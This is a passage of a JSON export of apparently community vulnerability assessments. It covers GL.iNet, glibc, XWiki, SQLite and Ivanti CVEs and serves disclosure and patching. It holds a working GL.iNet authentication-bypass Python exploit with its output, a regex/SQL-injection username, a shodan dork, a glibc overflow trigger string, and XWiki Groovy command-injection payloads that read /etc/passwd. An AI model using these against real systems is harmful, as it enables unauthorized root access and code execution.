      "revisionDate": "2024-01-07T19:53:37.428168Z",
      "document": "There is not yet an official record of this CVE available at the time of writing, but this is a critical vulnerability that gives an attacker unauthenticated access to a GL.iNet network devices. The issue is the bypass of `Nginx` authentication through a `Lua` string pattern matching and SQL injection vulnerability. There is an excellent writeup [From zero to botnet \u2013 GL.iNet going wild](https://libdzonerzy.so/articles/from-zero-to-botnet-glinet.html) by `DZONERZY` who discovered this vulnerability in October 2023.\r\n\r\nI am not gonna repeat the whole article here, because you can read it for yourself, but I will quickly summarize the issue.\r\nThe flaw sits in the `/usr/sbin/gl-ngx-session`, the actual `Lua` handler for the authentication mechanism which is the standard for GL.iNet network devices.\r\n\r\nWithin the this code there is a loop through the `/etc/shadow file` to authenticate a user where the username is used for the lookup using a `regex`.\r\nBy manipulating the username with additional `regex` statements, one can manipulate the lookup, so that it retrieves the `uid` field instead of the `password` field, hence using this for a valid root login will return a session id (`SID`) to be used for authentication.\r\n```lua\r\nlocal function login_test(username, hash)\r\n    if not username or username == \"\" then return false end\r\n\r\n    for l in io.lines(\"/etc/shadow\") do\r\n        local pw = l:match('^' .. username .. ':([^:]+)')\r\n        if pw then\r\n            for nonce in pairs(nonces) do\r\n                if utils.md5(table.concat({username, pw, nonce}, \":\")) == hash then\r\n                    nonces[nonce] = nil\r\n                    nonce_cnt = nonce_cnt - 1\r\n                    return true\r\n                end\r\n            end\r\n            return false\r\n        end\r\n    end\r\n```\r\nRegex injection happens inside the `login_test function`; it tries to match everything from the first colon (the hashed password) until the next one. \r\n```\r\nroot:$1$j9T2jD$5KGIS/2Ug.47GjW0jHOIB/2XwYUafYPh/X:19447:0:99999:7:::\r\n```\r\nWith the following username: `root:[^:]+:[^:]+` the regex in the code becomes `^root:[^:]+:[^:]+:([^:]+)` that shifts forward the matching group, thus making it return the `uid` (which is always 0) instead of the hashed password, which means that we can always win the authentication challenge by sending the following hash: `md5(<user>:0:<nonce>) -> root:[^:]+:[^:]+:0:<nonce>`.\r\n\r\nAdditionally, some ACL's are required that are stored in the `SQLite` db. This lookup, which is coded in `/usr/lib/lua/oui/db.lua`, is not successful because we manipulated the username. \r\n```lua\r\nM.get_acl_by_username = function(username)\r\n    if username == \"root\" then return \"root\" end\r\n\r\n    local db = sqlite3.open(DB)\r\n    local sql = string.format(\"SELECT acl FROM account WHERE username = '%s'\", username)\r\n\r\n    local aclgroup = \"\"\r\n\r\n    for a in db:rows(sql) do\r\n        aclgroup = a[1]\r\n    end\r\n\r\n    db:close()\r\n\r\n    return aclgroup\r\nend\r\n```\r\nHowever, by a brilliant combination of the regex and sql injection, `DZONERZY` was able to retrieve that information in one go with the username below.\r\n```\r\nroo[^'union selecT char(114,111,111,116)--]:[^:]+:[^:]+\r\n```\r\nPretty cool !!! \r\n\r\nBut unfortunately quite bad for our users who bought a GL.iNet network device, because at the time of writing most of the devices that are exposed to Internet (`shodan dork: title:\"GL.iNet Admin Panel\" `) are vulnerable for this authentication bypass. \r\nEven worse, in combination of [CVE-2023-50445](https://nvd.nist.gov/vuln/detail/CVE-2023-50445) all vulnerable GL.iNet network can be exploited without any authentication required. \r\nPlease check out my [attackerKB article](https://attackerkb.com/topics/3LmJ0d7rzC/cve-2023-50445) for more info.\r\n\r\nBelow is a python script that checks if your device is vulnerable for `CVE-2023-50919`.\r\n```python\r\n#!/usr/bin/env python3\r\n\r\n# Exploit Title: GL.iNet Authentication bypass\r\n# Shodan Dork: title:\"GL.iNet Admin Panel\"\r\n# Date: 30/12/2023\r\n# Exploit Author: h00die-gr3y@gmail.com\r\n# Vendor Homepage: https://www.gli-inet.com\r\n# Software Link: https://dl.gl-inet.com/?model=ar300m16\r\n# Firmware: openwrt-ar300m16-4.3.7-0913-1694589994.bin\r\n# Version: 4.3.7\r\n# Tested on: GL.iNet AR300M16\r\n# CVE: CVE-2023-50919\r\n\r\nimport json\r\nimport requests\r\nimport hashlib\r\nimport time\r\nfrom random import randint\r\nfrom sys import stdout, argv\r\n\r\nrequests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)\r\n\r\nproxies = {\r\n   'http': 'http://127.0.0.1:8080',\r\n   'https': 'http://127.0.0.1:8080',\r\n}\r\n\r\nproxies = {} # no proxy\r\n\r\ndef get_challenge(url):\r\n        data = {\r\n                'jsonrpc': '2.0',\r\n                'id': randint(1000, 9999),\r\n                'method': 'challenge',\r\n                'params': {'username': 'root'}\r\n        }\r\n        try:\r\n                res = requests.post(url, json=data, verify=False, proxies=proxies)\r\n                res.raise_for_status()\r\n                res_json = json.loads(res.content)\r\n                if 'result' in res_json:\r\n                        return res_json['result']['nonce']\r\n                print('[-] Error: could not find nonce')\r\n                return False\r\n        except requests.exceptions.RequestException:\r\n                print('[-] Error while retrieving challenge')\r\n        return False\r\n\r\n\r\ndef login(url, username, hash):\r\n        data = {\r\n                'jsonrpc': '2.0',\r\n                'id': randint(1000, 9999),\r\n                'method': 'login',\r\n                'params': {\r\n                        'username': '{}'.format(username),\r\n                        'hash': '{}'.format(hash)}\r\n        }\r\n        try:\r\n                res = requests.post(url, json=data, verify=False, proxies=proxies)\r\n                res.raise_for_status()\r\n                res_json = json.loads(res.content)\r\n                if 'result' in res_json:\r\n                        return res_json['result']['sid']\r\n                print('[-] Error: could not find sid')\r\n                return False\r\n\r\n        except requests.exceptions.RequestException:\r\n                print('[-] Error while retrieving sid')\r\n        return False\r\n\r\ndef main(url):\r\n        print('[+] Started GL.iNet - Authentication Bypass exploit')\r\n        username = \"roo[^'union selecT char(114,111,111,116)--]:[^:]+:[^:]+\"\r\n        pw = '0'\r\n        print('[+] Get challenge and login')\r\n        start = time.time()\r\n        nonce = get_challenge(url+'/rpc')\r\n        if nonce:\r\n                print('[+] nonce: {}'.format(nonce))\r\n                hash_str = username+':'+pw+':'+nonce\r\n                hash = hashlib.md5(hash_str.encode('utf-8')).hexdigest()\r\n                print('[+] hash: {}'.format(hash))\r\n                sid = login(url+'/rpc', username, hash)\r\n                print(f'[+] Time elapsed: {time.time() - start}')\r\n                if sid:\r\n                        print('[+] sid: {}'.format(sid))\r\n\r\n\r\nif __name__ == '__main__':\r\n        if len(argv) < 2:\r\n                print('Usage: {} <TARGET_URL>'.format(argv[0]))\r\n                exit(1)\r\n\r\n        main(argv[1])\r\n```\r\n```shell\r\n# python ./auth-bypass.py http://192.168.8.1\r\n[+] Started GL.iNet - Authentication Bypass exploit\r\n[+] Get challenge and login\r\n[+] nonce: 9B5p5lcK8V1rPu7tiwaKccPKkA8ijpwt\r\n[+] hash: 01f250624caab2acaf4feb290dd45d33\r\n[+] Time elapsed: 2.650479793548584\r\n[+] sid: rGZXQdxPkFzv1KwNaXTcWos6OLTnjU3e\r\n```\r\n\r\n### Mitigation\r\nThe following GL.iNet network devices are vulnerable. Please patch your devices to the latest firmware release.\r\n - A1300, AX1800, AXT1800, MT3000, MT2500/MT2500A: `v4.0.0 < v4.5.0`\r\n - MT6000: `v4.5.0 - v4.5.3`\r\n - MT1300, MT300N-V2, AR750S, AR750, AR300M, AP1300, B1300: `v4.3.7`\r\n - E750/E750V2, MV1000: `v4.3.8`\r\n -  X3000: `v4.0.0 - v4.4.2`\r\n - XE3000: `v4.0.0 - v4.4.3`\r\n - SFT1200: `v4.3.6`\r\n - and potentially others...\r\n\r\n### References\r\n[From zero to botnet: GL.iNet going wild by DZONERZY](https://libdzonerzy.so/articles/from-zero-to-botnet-glinet.html)\r\n[CVE-2023-50445](https://nvd.nist.gov/vuln/detail/CVE-2023-50445)\r\n[AttackerKB article: CVE-2023-50445 by h00die-gr3y](https://attackerkb.com/topics/3LmJ0d7rzC/cve-2023-50445)\r\n[GL.iNet home page](https://www.gl-inet.com/)\r\n\r\n### Credits\r\n* `DZONERZY`\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Credential Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "c8000a4e-9d28-4272-b895-486c41b09cda",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "593de58e-d9b7-4ad5-9506-70538067b6b5",
      "created": "2024-01-08T17:34:40.784004Z",
      "revisionDate": "2024-01-12T06:12:32.857356Z",
      "document": "Rapid7 has confirmed indicators of compromise from this zero-day attack in multiple customer environments. Barracuda has host and network-based IOCs here: https://www.barracuda.com/company/legal/esg-vulnerability",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        }
      ]
    },
    {
      "id": "bb155c59-1ee8-4dd0-a23e-830763217741",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "396fb396-0479-4c86-bdb2-299aa1c27465",
      "created": "2024-01-09T17:30:58.29208Z",
      "revisionDate": "2024-02-11T22:31:19.790091Z",
      "document": "\r\nThis is a privilege escalation vulnerability in the dynamic loader of glibc. `GLIBC_TUNABLES` is an environment variable which contains a colon separated set of switches that allow the user to tweak how glibc runs without having to recompile the binary. Example of how to properly set the environment variable:\r\n```\r\nGLIBC_TUNABLES=tunable1=AAA:tunable2=BBB\r\n```\r\n\r\nWhen the `GLIBC_TUNABLES` environment variable is parsed in vulnerable versions, we can cause a buffer overflow by setting: \r\n```\r\nGLIBC_TUNABLES=tunable1=tunable2=AAA\r\n```\r\n\r\nTaking a look at glibc source code we can see why this works; the key is the absence of the colon in the above example and how that is handled at lines 203-204:\r\n\r\n```\r\n// (GLIBC ld.so sources in ./glibc-2.37/elf/dl-tunables.c)\r\n162 static void\r\n163 parse_tunables (char *tunestr, char *valstring)\r\n164 {\r\n...\r\n168   char *p = tunestr;\r\n169   size_t off = 0;\r\n170 \r\n171   while (true)\r\n172     {\r\n173       char *name = p;\r\n174       size_t len = 0;\r\n175 \r\n176       /* First, find where the name ends.  */\r\n177       while (p[len] != '=' && p[len] != ':' && p[len] != '\\0')\r\n178         len++;\r\n179 \r\n180       /* If we reach the end of the string before getting a valid name-value\r\n181          pair, bail out.  */\r\n182       if (p[len] == '\\0')\r\n183         {\r\n184           if (__libc_enable_secure)\r\n185             tunestr[off] = '\\0';\r\n186           return;\r\n187         }\r\n188 \r\n189       /* We did not find a valid name-value pair before encountering the\r\n190          colon.  */\r\n191       if (p[len]== ':')\r\n192         {\r\n193           p += len + 1;\r\n194           continue;\r\n195         }\r\n196 \r\n197       p += len + 1;\r\n198 \r\n199       /* Take the value from the valstring since we need to NULL terminate it.  */\r\n200       char *value = &valstring[p - tunestr];\r\n201       len = 0;\r\n202 \r\n203       while (p[len] != ':' && p[len] != '\\0')\r\n204         len++;\r\n205 \r\n206       /* Add the tunable if it exists.  */\r\n207       for (size_t i = 0; i < sizeof (tunable_list) / sizeof (tunable_t); i++)\r\n208         {\r\n209           tunable_t *cur = &tunable_list[i];\r\n210 \r\n211           if (tunable_is_name (cur->name, name))\r\n212             {\r\n...\r\n219               if (__libc_enable_secure)\r\n220                 {\r\n221                   if (cur->security_level != TUNABLE_SECLEVEL_SXID_ERASE)\r\n222                     {\r\n223                       if (off > 0)\r\n224                         tunestr[off++] = ':';\r\n225 \r\n226                       const char *n = cur->name;\r\n227 \r\n228                       while (*n != '\\0')\r\n229                         tunestr[off++] = *n++;\r\n230 \r\n231                       tunestr[off++] = '=';\r\n232 \r\n233                       for (size_t j = 0; j < len; j++)\r\n234                         tunestr[off++] = value[j];\r\n235                     }\r\n236 \r\n237                   if (cur->security_level != TUNABLE_SECLEVEL_NONE)\r\n238                     break;\r\n239                 }\r\n240 \r\n241               value[len] = '\\0';\r\n242               tunable_initialize (cur, value);\r\n243               break;\r\n244             }\r\n245         }\r\n246 \r\n247       if (p[len] != '\\0')\r\n248         p += len + 1;\r\n249     }\r\n250 }\r\n```\r\n\r\nIn the initial loop of \"while (true)\" within parse_tunables() (at lines 221-235), the entire \"tunable1=tunable2=AAA\" gets copied directly into tunestr, effectively filling it up. Moving to lines 247-248, p remains unchanged (as p[len] is '\\0' due to the absence of ':' at lines 203-204), hence still referencing the value of \"tunable1,\" specifically \"tunable2=AAA.\" As the second loop of \"while (true)\" in parse_tunables() executes, \"tunable2=AAA\" gets added (as if it were another parameter) to tunestr, which is already at maximum capacity, resulting in a tunestr overflow. This can be used to invoke a SUID binary which will then, if we're lucky, invoke the shell code we've overflowed onto the stack.\r\n\r\n\r\n# Attacker Value & Exploitability \r\nThere were a wide range of linux distributions that shipped with the affected glibc library. However to exploit each distribution you need to determine a specific \"magic\" offset in order for the buffer overflow to result in RCE.  The original PoC shipped with tooling for users to determine this magic offset when ASLR was disabled, however it wasn't working for Fedora, RedHat, Amazon Linux, Gentoo and a couple others I tested. Due to the low level complexity of the vuln the PoC likely needed some massaging in order to exploit those distros.\r\n\r\nBecause ASLR is enabled by default, you need to loop over the exploit many times in order for it to be successful. You have approximately a 1/2700 chance of the exploit being successful every time you attempt to exploit it. You can easily loop over exploit attempts quickly so that part doesn't affect exploitability too much though does add a significant wait time for the exploit to be successful.\r\n\r\nBy default Ubuntu patches this vuln automatically as a part of the Automatic Security Updates, so you do have to go out of your way to set up a vulnerable instance.\r\n\r\n",
      "score": 3,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "cd0d2dd8-7716-4d16-b30a-4c470e9d57ed",
      "editorId": "18981cab-a692-41d3-8379-6c3917c07703",
      "topicId": "c31a54f0-f463-4c34-8140-2cd48f91232c",
      "created": "2024-01-11T03:11:32.619229Z",
      "revisionDate": "2024-01-12T01:38:33.600901Z",
      "document": "# Overview\r\n\r\nXWiki is a Java-based, highly customizable and extensible enterprise-level Wiki platform, offering cross-database support, a powerful plugin system, a flexible template engine, and comprehensive security management, suitable for knowledge management and collaboration across various business needs.\r\n\r\nThis vulnerability, identified as [XWIKI-21173](https://jira.xwiki.org/browse/XWIKI-21173), is a critical remote code execution (RCE) vulnerability present in the user registration process of XWiki. Specifically, it allows attackers to insert malicious scripts in the \u201cname\u201d field during user registration, which are subsequently executed on the server, potentially leading to unauthorized data access or system control. This vulnerability exposes a security flaw in XWiki's handling of user input and script execution, posing a serious threat to the overall system security and necessitates immediate remediation to protect user data and system integrity.\r\n\r\n# Technical Analysis\r\n\r\nIn `RegistrationConfig.xml`, user inputs such as register_first_name and register_last_name were directly embedded into the registration success message, without appropriate sanitization or escaping. Attackers could inject malicious Groovy scripts through the registration form. When these scripts were executed on the server, they could trigger arbitrary commands, resulting in a remote code execution (RCE) vulnerability.\r\n\r\n```xml\r\n<registrationSuccessMessage>#set($fullName = \"$request.get('register_first_name') $request.get('register_last_name')\")\r\n{{info}}$services.localization.render('core.register.successful', [\"[[$fullName&gt;&gt;$userSpace$userName]]\", $userName]){{/info}}</registrationSuccessMessage>\r\n```\r\nFor this, we can generate the following payload based on the original configuration.\r\n\r\n* `]]{{/html}}{{async}}{{groovy}}\"touch /tmp/success\".execute().waitFor(){{/groovy}}{{/async}}`\r\n* `]]{{/html}}{{async}}{{groovy}}throw new Exception(\"cat /etc/passwd\".execute().text){{/groovy}}{{/async}}`\r\n\r\nFirstly, `]]{{/html}}` is used to end any previously started HTML rendering. Following this, the `{{async}}` tag begins an asynchronous code block, meaning the subsequent code will run asynchronously, not blocking the rest of the page. The {{groovy}} tag indicates that the following code is written in the Groovy language. Finally, the `{{/groovy}}{{/async}}` tags conclude the Groovy script block and the asynchronous block.\r\n\r\n\r\nThe modifications made to the `RegistrationConfig.xml` file in the GitHub commit for [XWIKI-21173](https://github.com/xwiki/xwiki-platform/commit/b290bfd573c6f7db6cc15a88dd4111d9fcad0d31) significantly enhance the security and accuracy of the registration success message within XWiki. By shifting to a more secure method of constructing user links using `$xwiki.getUserName` and employing `$services.localization.render` for message templating, these changes mitigate potential vulnerabilities such as code injection. This approach not only ensures the safe embedding of user-generated content but also supports multilingual environments, demonstrating a commitment to improving both the security and versatility of the XWiki platform.\r\n```shell\r\ngit show b290bfd573c\r\n...omitted...\r\n\r\ndiff --git a/xwiki-platform-core/xwiki-platform-administration/xwiki-platform-administration-ui/src/main/resources/XWiki/RegistrationConfig.xml b/xwiki-platform-core/xwiki-platform-administration/xwiki-platform-administration-ui/src/main/resources/XWiki/RegistrationConfig.xml\r\nindex ae1e3b1d9a3..640c8d1bd36 100644\r\n--- a/xwiki-platform-core/xwiki-platform-administration/xwiki-platform-administration-ui/src/main/resources/XWiki/RegistrationConfig.xml\r\n+++ b/xwiki-platform-core/xwiki-platform-administration/xwiki-platform-administration-ui/src/main/resources/XWiki/RegistrationConfig.xml\r\n@@ -555,8 +555,9 @@\r\n<passwordRuleOneUpperCaseEnabled>0</passwordRuleOneUpperCaseEnabled>\r\n</property>\r\n<property>\r\n  -      <registrationSuccessMessage>#set($fullName = \"$request.get('register_first_name') $request.get('register_last_name')\")\r\n  -{{info}}$services.localization.render('core.register.successful', [\"[[$fullName&gt;&gt;$userSpace$userName]]\", $userName]){{/info}}</registrationSuccessMessage>\r\n  +      <registrationSuccessMessage>#set($message = $services.localization.render('core.register.successful', 'xwiki/2.1', ['USERLINK', $userName]))\r\n  +#set($userLink = $xwiki.getUserName(\"$userSpace$userName\"))\r\n  +{{info}}$message.replace('USERLINK', \"{{html clean=false}}$userLink{{/html}}\"){{/info}}</registrationSuccessMessage>\r\n```\r\n\r\n# Reference\r\n1. https://jira.xwiki.org/browse/XWIKI-21173\r\n2. https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-rj7p-xjv7-7229\r\n3. https://github.com/xwiki/xwiki-platform/commit/b290bfd573c6f7db6cc15a88dd4111d9fcad0d31\r\n4. https://attackerkb.com/topics/Hn4W1casCs/cve-2024-21650\r\n5. https://www.xwiki.org/xwiki/bin/view/Documentation/UserGuide/Features/XWikiSyntax/?syntax=2.1&section=Macros\r\n6. https://extensions.xwiki.org/xwiki/bin/view/Extension/Localization/Scripting/\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Command and Control",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "eab8c044-5a9c-4a4b-91f7-7eec584f2127",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "26d5c67c-c382-4372-8a5c-bbc4aa19f0a0",
      "created": "2024-01-11T10:36:46.875588Z",
      "revisionDate": "2024-01-11T10:36:46.875536Z",
      "document": "CVE-2022-35737 is a vulnerability in SQLite, specifically in versions 1.0.12 through 3.39.x before 3.39.2. It allows for an array-bounds overflow if a string argument to a C API contains billions of bytes. This vulnerability can lead to various consequences, ranging from a simple application crash to arbitrary code execution.\r\n\r\n- The issue lies in the `sqlite3_snprintf` function\u2019s code, used in C/C++ programming for database interaction. Passing an exceedingly large string input (over 2 GB) to this function can cause a crash, enabling a denial of service (DoS) attack.\r\n- This bug likely entered the code 22 years ago and remained undetected due to the improbability of passing gigabytes of data as function parameters at that time.\r\n- The vulnerability was closed with the release of SQLite 3.39.2 in July 2022. However, software that includes SQLite needs to be updated to incorporate this fix.\r\n\r\nThe vector string for this score is CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H, indicating network access for the attack, low attack complexity, no privileges required, no user interaction required, no scope change, and high impact on availability.\r\n\r\n**Affected Platforms:**\r\n- This vulnerability affects various platforms, including those running Amazon Linux, where updates have been provided to address this issue.\r\n\r\n**Mitigation and Impact:**\r\n- The vulnerability is specific to the interface for C applications and only if the code is compiled with certain parameters.\r\n- The practical exploitability of this vulnerability is still a subject of research, with limitations on its impact based on how SQLite is compiled and used in applications.\r\n\r\n**Additional Considerations:**\r\n- This vulnerability is notable for its long presence in the SQLite code and the challenges in detecting it using standard testing methods like fuzzing.\r\n\r\nIn terms of exploitation, the vulnerability's practical use for an attack is still under investigation, with researchers pointing to several limitations that reduce the likelihood of successful exploitation.\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "5199772a-a6f1-486c-b961-5ea1b01f3a5f",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "40a59992-3535-439c-a358-ec629cfa6115",
      "created": "2024-01-11T10:43:48.028524Z",
      "revisionDate": "2024-01-17T09:55:54.680947Z",
      "document": "CVE-2023-46805 is an authentication bypass vulnerability found in the web component of Ivanti Connect Secure (ICS), which was previously known as Pulse Connect Secure and Ivanti Policy Secure. This vulnerability affects all supported versions of Ivanti ICS and Policy Secure 9.x and 22.x.\r\n\r\n**Details of CVE-2023-46805:**\r\n- The vulnerability allows an attacker to bypass control checks and access restricted resources.\r\n- It was exploited in the wild in a chained attack for unauthenticated remote code execution (RCE) as early as December 2023.\r\n- According to Volexity, a cybersecurity firm, the zero-day exploitation of these flaws was attributed to UTA0178, believed to be a Chinese nation-state level threat actor.\r\n- The attackers deployed webshells, including GLASSTOKEN, on both internet-facing and internal assets to maintain persistence on a network after compromise.\r\n\r\n**Mitigation and Updates:**\r\n- As of the latest information, Ivanti has not released a patch for this vulnerability. However, they provided a mitigation script that should be used immediately.\r\n- Ivanti announced that patches for this vulnerability would be released in a staggered schedule, with the first version targeted to be available in the week of 22 January 2024 and the final version by the week of 19 February 2024.\r\n- Users and administrators of affected product versions are advised to apply mitigation measures provided by Ivanti.\r\n\r\n**Impact and Detection:**\r\n- Attackers modified legitimate components of Ivanti Connect Secure, such as `compcheck.cgi` and `lastauthserverused.js`, to support execution of remote commands and credential theft.\r\n- Organizations can detect potential compromise through network traffic analysis, VPN device log analysis, and execution of the Integrity Checker Tool.\r\n\r\n**Recommendation:**\r\n- It is crucial for users and administrators to apply the current workarounds immediately and to update the systems once patches are released.\r\n- Monitoring for signs of compromise is recommended, including examining network traffic and VPN device logs.\r\n",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "8ab073cf-5e59-456d-9ac7-a54585f6a444",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "69f8a1ee-a19c-4252-b15e-9be062bc37da",
      "created": "2024-01-11T10:49:07.621415Z",
      "revisionDate": "2024-01-17T09:57:52.708943Z",
      "document": "CVE-2024-21887 is a command injection vulnerability in the web component of Ivanti Connect Secure (ICS) and Ivanti Policy Secure. This vulnerability, rated with a high severity CVSS score of 9.1, allows an authenticated user to execute arbitrary commands.\r\n\r\n**Details of CVE-2024-21887:**\r\n- CVE-2024-21887 affects all supported versions of Ivanti ICS and Policy Secure 9.x and 22.x.\r\n- This vulnerability was exploited in the wild along with CVE-2023-46805 in a chained attack for unauthenticated remote code execution (RCE) as early as December 3, 2023.\r\n- The exploitation of these vulnerabilities was attributed to UTA0178, suspected to be a Chinese nation-state level threat actor.\r\n- These vulnerabilities were used in attacks involving the deployment of a custom web shell, GLASSTOKEN, on both internet-facing and internal assets for persistent network access.\r\n\r\n**Attack Mechanisms:**\r\n- Attackers manipulated legitimate components of Ivanti Connect Secure, such as `compcheck.cgi`, to support the execution of remote commands and credential theft.\r\n- The attacks were characterized by reconnaissance efforts, lateral movement, and deployment of GLASSTOKEN for persistent remote access.\r\n\r\n**Mitigation and Updates:**\r\n- As of the latest information, Ivanti has not released a patch for this vulnerability. However, they provided a mitigation script that should be used immediately.\r\n- Ivanti announced that patches for this vulnerability would be released in a staggered schedule, starting from the week of January 22, 2024.\r\n- Users and administrators of affected product versions are advised to apply the mitigation measures provided by Ivanti.\r\n\r\n**Detection of Compromise:**\r\n- Organizations can detect potential compromise through network traffic analysis, VPN device log analysis, and the execution of the Integrity Checker Tool.\r\n- Monitoring for signs of compromise is recommended, including examining network traffic and VPN device logs.\r\n\r\n**Recommendation:**\r\n- Immediate application of current workarounds is crucial until patches are released.\r\n- Continuous monitoring for signs of compromise is essential to ensure network security.\r\n\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
